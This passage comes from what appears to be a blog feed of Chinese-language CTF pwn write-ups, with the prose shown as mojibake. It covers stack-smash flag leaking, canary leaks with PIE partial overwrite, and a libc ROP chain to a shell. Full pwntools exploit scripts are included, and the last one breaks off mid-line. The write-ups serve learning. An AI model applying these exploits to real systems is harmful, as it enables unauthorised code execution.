ä¸ºè¿™ä¸ªå›è½¦ä¼šè¦†ç›–æ‰<code>rbp</code>æœ€åçš„å€¼ã€‚ã€‚è¿™æ ·æˆ‘ä»¬å°±æ— æ³•å¾—åˆ°æ­£ç¡®çš„å€¼ã€‚å¦å¤–ä¸€ä¸ªæ˜¯pwntoolsé‡Œé¢çš„libcè®¾ç½®ï¼Œå¦‚æœè®¾ç½®äº†libcçš„addressï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ä½¿ç”¨libcè¿›è¡Œæœç´¢çš„æ—¶å€™å°±ä¸ç”¨é¢å¤–å†åŠ libcçš„åŸºåœ°å€ï¼Œå› ä¸ºé‡Œé¢å·²ç»è‡ªåŠ¨å¸®ä½ åŠ ä¸Šäº†ã€‚ä½†æ˜¯æ²¡æœ‰ä½¿ç”¨libcç¬¦å·æˆ–è€…æœç´¢çš„åœ°å€è¿˜æ˜¯éœ€è¦æ‰‹åŠ¨å¢åŠ libcçš„åŸºåœ°å€å€¼ã€‚</p><h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h2><p>ä¸€é“ç¥å¥‡çš„é¢˜ç›®ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå¾ªç¯ä¼šè¦†ç›–flagçš„å†…å®¹ã€‚åŒæ—¶æ–‡ä»¶å¼€å¯äº†canaryå’Œå †æ ˆæ‰§è¡Œä¿æŠ¤ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰è¶£çš„åˆ©ç”¨æ€è·¯ï¼Œé‚£å°±æ˜¯stack smashï¼Œæ°æ°åˆ©ç”¨canaryçš„checkæœºåˆ¶ï¼Œå®ƒåœ¨checkå¤±è´¥ä¹‹åä¼šæ‰“å°å‡º<code>argv[0]</code>çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœèƒ½è¦†ç›–æˆå…¶ä»–åœ°å€ï¼Œè¿™é‡Œå°±èƒ½å¤Ÿåˆ©ç”¨æ¥æ³„éœ²å†…å­˜æ•°æ®ã€‚è€Œè¿™é“é¢˜ç›®çš„flagå·²ç»åœ¨ä¸€å¼€å§‹å°±å­˜è¿›äº†å†…å­˜ä¸­ï¼ŒåŒæ—¶ç”±äº<code>.bss</code>èŠ‚çš„ç‰¹æ€§ï¼ŒELFæ–‡ä»¶åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒä¼šè¢«æ˜ å°„ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å¦å¤–ä¸€å¤„æ²¡æœ‰è¢«è¦†ç›–æ‰çš„å†…å®¹åœ°å€å¡«å…¥<code>argv[0]</code>çš„åœ°å€å¤„ï¼Œå°±èƒ½å¤Ÿget flagã€‚</p><img src="/2019/09/14/fancy-rop-practice/3.png"><p>åˆšå¥½è¿™é‡Œæœ‰ä¸€ä¸ªæº¢å‡ºæ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œé‚£ä¹ˆå…ˆæ¥çœ‹çœ‹<code>argv[0]</code>çš„åœ°å€ã€‚</p><img src="/2019/09/14/fancy-rop-practice/4.png"><p>åœ¨è¿™é‡Œèƒ½å¤Ÿå¾ˆæ˜æ˜¾çš„çœ‹åˆ°ç¨‹åºåï¼Œè€Œè¿™é‡Œä¸€å®šå°±æ˜¯<code>argv[0]</code>çš„åœ°å€ï¼Œ0x7fffffffdc78(å¤§é›¾ï¼Ÿ)ã€‚è¿™é‡Œçš„åœ°å€æŒ‡å‘å¦å¤–ä¸€ä¸ªåœ°å€ï¼Œè€Œé‚£ä¸ªåœ°å€æ‰æ˜¯å­˜å‚¨ç€å­—ç¬¦ä¸²çš„æŒ‡é’ˆçš„å€¼ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æˆ‘è¿˜å‡ºé”™äº†ï¼Œæœ€åéœ€è¦è¦†ç›–çš„åœ°å€ä¸º0x7fffffffdd48ã€‚æ¥ä¸‹æ¥åªéœ€è¦ç¡®å®šå‡ºæˆ‘ä»¬çš„è¾“å…¥çš„åœ°å€ï¼Œå°±èƒ½æ§åˆ¶æº¢å‡ºçš„å­—èŠ‚æ•°ã€‚</p><img src="/2019/09/14/fancy-rop-practice/5.png"><p>çœ‹åˆ°æˆ‘ä»¬çš„<code>rsi</code>å’Œ<code>rsp</code>çš„å€¼éƒ½æ˜¯0x7fffffffdb30ï¼Œè¯´æ˜æ¥ä¸‹æ¥getsçš„è¾“å…¥ä¼šå†™å…¥è¿™é‡Œã€‚æ¥ä¸‹æ¥å°±æ˜¯éœ€è¦è¯»å‡ºæ¥çš„flagåœ°å€äº†ã€‚</p><img src="/2019/09/14/fancy-rop-practice/6.png"><p>æˆ‘åœ¨è¦†ç›–çš„flagä¸­å¡«å…¥çš„aaï¼Œé€šè¿‡æœç´¢è¿™ä¸ªå­—ç¬¦ä¸²æ‰¾åˆ°ç›¸åº”çš„åœ°å€ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªæ˜ å°„åœ°å€ï¼Œé€šè¿‡IDAæˆ‘ä»¬èƒ½çŸ¥é“flagçš„æ ·å­ä¸º<code>32C3...</code>ï¼Œæ‰€æœ‰æœç´¢è¿™ä¸ªå°±èƒ½å¾—åˆ°ç¬¬äºŒä¸ªflagçš„åœ°å€ã€‚</p><img src="/2019/09/14/fancy-rop-practice/7.png"><p>è¿™é‡Œçœ‹åˆ°å¦å¤–ä¸€ä¸ªå®Œæ•´çš„flagåœ°å€ä¸º0x400d20ï¼Œé€šè¿‡ä¸€ä¸ªæ ˆæº¢å‡ºæ¥è¦†ç›–<code>argv[0]</code>çš„åœ°å€ä¸ºflagçš„åœ°å€ï¼Œè¿™æ ·æº¢å‡ºä¹‹åçš„checkå¤±è´¥å°±èƒ½æŠŠflagæ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template readme.bin</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'readme.bin'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'readme.bin'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path)</span><br><span class="line"></span><br><span class="line">argv_addr = <span class="number">0x7fffffffdd48</span></span><br><span class="line">stack_addr = <span class="number">0x7fffffffdb30</span></span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">'a'</span> * (argv_addr - stack_addr)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'name? '</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'flag: '</span>)</span><br><span class="line">io.sendline(<span class="string">'bb'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="/2019/09/14/fancy-rop-practice/8.png"><p>æœ€åä»stack smashçš„checkä¸­get flagä¿¡æ¯ï¼Œå¦‚æœæ˜¯åœ¨æœåŠ¡å™¨ä¸Šå°±èƒ½æ‹¿åˆ°çœŸæ­£çš„flagã€‚è¿™é“é¢˜ä¹Ÿè§£å†³äº†æˆ‘çš„ä¸€ä¸ªç–‘æƒ‘ï¼Œè™½ç„¶åœ°å€ä¸ä¸€æ ·ï¼Œä½†æ˜¯åç§»æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°åœ°å€ä¹‹åè®¡ç®—éœ€è¦è¦†ç›–çš„é•¿åº¦ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼ŒåŒæ—¶<code>.bss</code>èŠ‚çš„æ˜ å°„åˆæ˜¯ä¸å˜çš„ï¼Œè¿™æ ·å°±èƒ½ç¨³å®šçš„è¦†ç›–æˆå¦å¤–ä¸€ä¸ªflagçš„åœ°å€ã€‚</p><h2 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h2><p>ä¸€é“å®‰æ’çš„æœˆèµ›é¢˜ç›®ï¼Œé¢˜ç›®ä¸­æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡èƒ½è¾“å…¥0x30ï¼Œèƒ½å¤Ÿåˆšå¥½æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒæ¬¡èƒ½è¾“å…¥0x60ï¼Œéƒ½å†™åœ¨åŒä¸€æ®µç¼“å†²åŒºä¸­ã€‚ç¨‹åºå¼€å¯äº†canaryï¼ŒPIEï¼ŒNXç­‰ç­‰ä¿æŠ¤ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥éœ€è¦å…ˆæ³„éœ²å‡ºcanaryçš„å€¼ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº†ä¹‹å‰çš„trickï¼Œç”±äºè¯»å…¥æ•°æ®æ˜¯ä½¿ç”¨çš„readå¹¶ä¸ä¼šæœ‰<code>\0</code>åœ¨æœ«å°¾ï¼Œç”±äºcanaryçš„æœ€ä½ä½ä¸º0ï¼Œè¿™æ ·æˆ‘ä»¬å¤šè¦†ç›–ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œè®©printfç›´æ¥æŠŠcanaryçš„å€¼æ‰“å°å‡ºæ¥ã€‚</p><p>è·å–åˆ°canaryä¹‹åï¼Œå†æ¬¡è§‚å¯Ÿç¨‹åºï¼Œå‘ç°æœ‰ç•™æœ‰getshellçš„å‡½æ•°ï¼Œé‚£é¢˜ç›®å°±ç®€å•å¾ˆå¤šäº†ã€‚è¿™é‡Œå¦‚æœèƒ½ä¿®æ”¹è¿”å›åœ°å€ä¸ºå‡½æ•°åœ°å€å°±èƒ½getshellã€‚ä½†æ˜¯ç¨‹åºå¼€äº†PIEæ€ä¹ˆåŠï¼Ÿï¼Ÿï¼Ÿ</p><p>ä¸ç”¨æ€•ï¼ŒPIEçš„éšæœºåŒ–ä¸ä¼šå½±å“ä½12bitçš„åœ°å€ï¼Œè¿™é‡Œåªéœ€è¦æš´åŠ›æµ‹è¯•åœ°å€å°±å¾ˆæœ‰å¯èƒ½å¾—åˆ°æ­£ç¡®çš„åœ°å€ã€‚åªæ˜¯åœ¨ç¨‹åºä¸­æœ‰4bitåœ¨å˜åŒ–ï¼Œgetshellçš„åœ°å€ä¸º<code>a3e</code>ï¼Œç”±äºè¿˜æœ‰1bitæ˜¯ä¸èƒ½ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¦†ç›–æˆ<code>0a3e</code>æ¥ç¢°è¿æ°”å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template babypie</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'babypie'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'babypie'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#if args['REMOTE']:</span></span><br><span class="line"><span class="comment">#    io = remote()</span></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    io = process(exe.path)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(exe.path)</span><br><span class="line">        io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">        payload1 = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">1</span>)</span><br><span class="line">        io.send(payload1)</span><br><span class="line"></span><br><span class="line">        io.recvuntil(<span class="string">'a'</span> * <span class="number">0x29</span>)</span><br><span class="line">        <span class="comment">#canary = u64(io.recv(7).rjust(8, '\0'))</span></span><br><span class="line">        canary = u64(<span class="string">'\0'</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">        success(<span class="string">'canary: '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">        io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">        payload2 = <span class="string">'a'</span> * <span class="number">0x28</span></span><br><span class="line">        payload2 += p64(canary)</span><br><span class="line">        payload2 += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">        payload2 += <span class="string">'\x3e\x0a'</span></span><br><span class="line">        io.send(payload2)</span><br><span class="line"></span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„ljustå’Œrjustæ˜¯å·¦å¯¹é½å’Œå³å¯¹é½ï¼Œä¸€å¼€å§‹æ²¡æœ‰å¼„æ¸…æ¥šã€‚ã€‚ã€‚å·¦å¯¹é½æ˜¯åœ¨æœ«å°¾å¡«å……ï¼Œå³å¯¹é½æ˜¯åœ¨å¤´éƒ¨å¡«å……ã€‚</p><h2 id="chess-æœªè§£å‡º"><a href="#chess-æœªè§£å‡º" class="headerlink" title="chess(æœªè§£å‡º)"></a>chess(æœªè§£å‡º)</h2><p>å…ˆæ£€æŸ¥å®‰å…¨é€‰é¡¹ï¼Œå¼€å¯äº†NXå’ŒPIEï¼Œä¸èƒ½å†™shellcodeäº†ã€‚å‘ç°æ˜¯ä¸€ä¸ªä¸‹æ£‹çš„æ¸¸æˆï¼Œç„¶åé‡Œé¢é€šè¿‡è¾“å…¥å­—æ¯æ•°å­—æ¥ç§»åŠ¨ï¼Œæ¯æ¬¡ç§»åŠ¨éƒ½ä¼šæ‰“å°ä¸€æ¬¡ã€‚</p><p>ç„¶è€Œæœåˆ°çš„éŸ©æ–‡è§£æ³•è‚¯æœ¬çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚è¿™é‡Œå°±è®°å½•ä¸€ä¸‹äº†ï¼ŒæœŸæœ›ä»¥åå¯ä»¥åšå‡ºæ¥</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://23r3f.github.io/2018/12/03/2018-12-3-pwndbg%E7%94%A8%E6%B3%95/" target="_blank" rel="noopener">https://23r3f.github.io/2018/12/03/2018-12-3-pwndbg%E7%94%A8%E6%B3%95/</a></p><p><a href="http://blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220335795719&amp;categoryNo=0&amp;parentCategoryNo=0&amp;viewDate=&amp;currentPage=1&amp;postListTopCurrentPage=1" target="_blank" rel="noopener">http://blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220335795719&amp;categoryNo=0&amp;parentCategoryNo=0&amp;viewDate=&amp;currentPage=1&amp;postListTopCurrentPage=1</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç»§ç»­è¿›è¡Œç€æ ˆæº¢å‡ºçš„ç»ƒä¹ ï¼Œè¿™æ¬¡æ˜¯å‚è€ƒäº†ctf-wikiä¸Šé¢çš„æ¼”ç¤ºé¢˜ç›®ï¼Œåœ¨å¤ç°è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•ã€‚&lt;/p&gt;
&lt;h2 id=&quot;over&quot;&gt;&lt;a href=&quot;#over&quot; class=&quot;headerlink&quot; title=&quot;over&quot;&gt;&lt;/a&gt;over&lt;/h2&gt;&lt;p&gt;å®‰æ’æœˆèµ›çš„é¢˜ç›®ï¼Œ
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>åŸºç¡€ROPå­¦ä¹ </title>
    <link href="https://hurricane618.me/2019/07/26/basic-rop-practice/"/>
    <id>https://hurricane618.me/2019/07/26/basic-rop-practice/</id>
    <published>2019-07-26T07:11:33.000Z</published>
    <updated>2019-07-26T07:48:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å¼€å§‹å…¥é—¨pwnï¼Œåœ¨ç™½æ³½æ–°æ‰‹ojé‚£é‡Œå­¦äº†ä¸€æ³¢ä¹‹åå¼€å§‹è‡ªå·±å­¦å‰©ä¸‹çš„å†…å®¹ã€‚çœ‹åˆ°atumå¤§ä½¬æ¨èçš„ä¸‰é“åŸºç¡€ROPé¢˜ç›®ï¼Œå°±ç»ƒä¹ ä¸€ä¸‹ï¼Œå­¦ä¹ æ€è·¯æ€»ç»“ç»éªŒã€‚åœ¨ç½‘ä¸Šæ‰¾é¢˜çš„è¿‡ç¨‹ä¸­å‘ç°vssåŸºæœ¬ä¸Šç»è¿¹äº†ã€‚ã€‚ã€‚è¾›è‹¦ä¸€ç•ªä¹‹åç»ˆäºæ‰¾åˆ°ï¼Œä¸ºäº†åé¢çš„äººä¹Ÿèƒ½å¿«é€Ÿæ‰¾åˆ°é¢˜ç›®æˆ‘å°±æŠŠä¸‰é“é¢˜ä¸€èµ·ä¸Šä¼ äº†ã€‚</p><p><a href="http://hurricane618.me/resource/basic-rop/vss">http://hurricane618.me/resource/basic-rop/vss</a></p><p><a href="http://hurricane618.me/resource/basic-rop/ropasaurusrex">http://hurricane618.me/resource/basic-rop/ropasaurusrex</a></p><p><a href="http://hurricane618.me/resource/basic-rop/r0pbaby">http://hurricane618.me/resource/basic-rop/r0pbaby</a></p><h2 id="r0pbaby"><a href="#r0pbaby" class="headerlink" title="r0pbaby"></a>r0pbaby</h2><p>ä¸€é“å¼ºåŒ–ç‰ˆçš„å…¥é—¨æ ˆæº¢å‡ºï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯æ ˆæº¢å‡ºéœ€è¦è‡³å°‘0x440æ‰è¡Œï¼Œç„¶è€Œè¿™ä¸ªå€¼ä¸º1088ï¼Œä½†æ˜¯é¢˜ç›®é‡Œé¢é™åˆ¶äº†é•¿åº¦æœ€å¤§ä¸º1024ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œä¸èƒ½ç”¨å¡«å……æ•°æ®çš„æ–¹æ³•æ¥å®ç°æ§åˆ¶æµçš„åŠ«æŒã€‚ï¼ˆå¤§é›¾ï¼Ÿï¼‰</p><img src="/2019/07/26/basic-rop-practice/1.jpg"><p>çœ‹äº†ä¸€çœ¼wpæ‰å‘ç°â€¦â€¦æˆ‘å°±æ˜¯ä¸€ä¸ªsb</p><img src="/2019/07/26/basic-rop-practice/2.jpg"><p>åœ¨ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœè¶…è¿‡é™åˆ¶çš„1024å°±ä¼šè¾“å‡ºéæ³•æç¤ºï¼Œåœ¨å¦å¤–ä¸€è¾¹å®ƒä¼šé€å­—èŠ‚çš„è¯»å…¥å­—ç¬¦å¹¶æŠŠå®ƒä»¬é¡ºåºçš„ä¿å­˜è¿›<code>nptr</code>è¿™ä¸ªå˜é‡ä¸­ï¼Œåœ¨æœ€åä½¿ç”¨<code>memcpy</code>å‡½æ•°æŠŠä¿å­˜çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°<code>savedregs</code>è¿™ä¸ªæ ‡è®°ä¸­ï¼Œæˆ‘ä»¬åŒå‡»è¿™ä¸ªæ ‡è®°å°±å¯ä»¥è·³è½¬åˆ°æ ˆä½ç½®ä¸­ã€‚</p><img src="/2019/07/26/basic-rop-practice/3.jpg"><p>è€Œè¿™ä¸ªä½ç½®åˆšå¥½å°±æ˜¯<code>old rbp</code>çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¦†ç›–æ‰8ä¸ªå­—èŠ‚å°±èƒ½æº¢å‡ºã€‚æº¢å‡ºä¹‹åæ¥ä¸Šgadgetå’Œå‚æ•°ä»¥åŠsystemçš„åœ°å€å°±èƒ½å®Œæˆæ“ä½œã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œç”±äºç¨‹åºå¼€å¯äº†åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥ä¸èƒ½æ‰¾ç¨‹åºä¸­çš„gadgetï¼Œåªèƒ½æ‰¾libcä¸­çš„gadgetï¼Œå› ä¸ºlibcçš„åŸºåœ°å€æ˜¯å¯ä»¥ç®—å‡ºæ¥çš„ï¼Œæ‰€ä»¥æœ€ç»ˆä¹Ÿæ˜¯èƒ½ç®—å‡ºlibcä¸­çš„gadgetã€‚</p><p>å°±è¿™æ ·å†libcä¸­æ‰¾åˆ°gadgetå’Œbinshå­—ç¬¦ä¸²ï¼Œæ··åˆç€å†™å‡ºpayloadï¼Œè¿™é‡Œè¿˜éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯libcçš„åœ°å€ä¸ç­‰äºlibcçš„åŸºåœ°å€ï¼ŒåŸºåœ°å€æ˜¯ç”¨æ¥æ¨ç®—libcå‡½æ•°ç”¨çš„èµ·å§‹åœ°å€ï¼Œlibcçš„åœ°å€åº”è¯¥æ˜¯libcçš„åŠ è½½åœ°å€ï¼Œä¸­é—´åº”è¯¥è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ•°æ®ã€‚</p><p>æœ€åè¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯è¿™ç§æœ‰ä¸€ç›´å¾ªç¯çš„ç¨‹åºè¿è¡Œæ—¶ï¼Œæˆ‘ä»¬getshellä¹‹åï¼Œç›¸å½“äºæ˜¯å¼€äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œéœ€è¦å°†åŸæ¥çš„è¿›ç¨‹é€€æ‰ï¼Œæ‰èƒ½è¿›å…¥shellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./r0pbaby"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">rdi_ret_offset = <span class="number">0x21102</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.recvuntil(": ")</span></span><br><span class="line"><span class="comment">#sh.sendline("1")</span></span><br><span class="line"><span class="comment">#sh.recvuntil(": ")</span></span><br><span class="line"><span class="comment">#libc_addr = int(sh.recvuntil("\n").strip(), 16)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"system"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">system_addr = int(sh.recvuntil(<span class="string">"\n"</span>).strip(), <span class="number">16</span>)</span><br><span class="line">libc_addr = system_addr - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">rdi_ret = libc_addr + rdi_ret_offset</span><br><span class="line">binsh = libc_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">sh.sendline(<span class="string">"33"</span>)</span><br><span class="line">payload = <span class="number">0x8</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment">#print sh.pid</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span 